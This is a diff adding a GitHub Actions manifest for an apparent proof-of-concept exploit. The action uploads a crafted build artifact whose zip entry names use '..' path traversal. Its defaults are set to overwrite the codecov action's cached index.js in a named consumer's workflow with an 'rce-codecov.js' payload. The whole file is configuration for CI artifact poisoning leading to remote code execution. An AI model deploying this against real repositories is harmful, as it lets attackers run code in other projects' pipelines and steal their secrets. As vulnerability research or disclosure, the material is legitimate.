@@ -1,0 +1,15 @@
+name: Upload crafted artifact
+description: Uploads an artifact whose zip entry names contain mid-path ".." components
+inputs:
+  name:
+    description: Artifact name (must match the consumer's download pattern)
+    default: coverage-report-ubuntu-latest-20.x
+  pairs:
+    description: "comma-separated source->target pairs (target absolute or relative to the consumer workspace)"
+    default: "poc-payload/rce-codecov.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
+  extract-dir:
+    description: "extraction directory under RUNNER_TEMP that mirrors the consumer's extraction base"
+    default: "gab-poc-adobe-customer-profile-coverage/coverage-report-ubuntu-latest-20.x"
+runs:
+  using: node20
+  main: plant-artifact.js
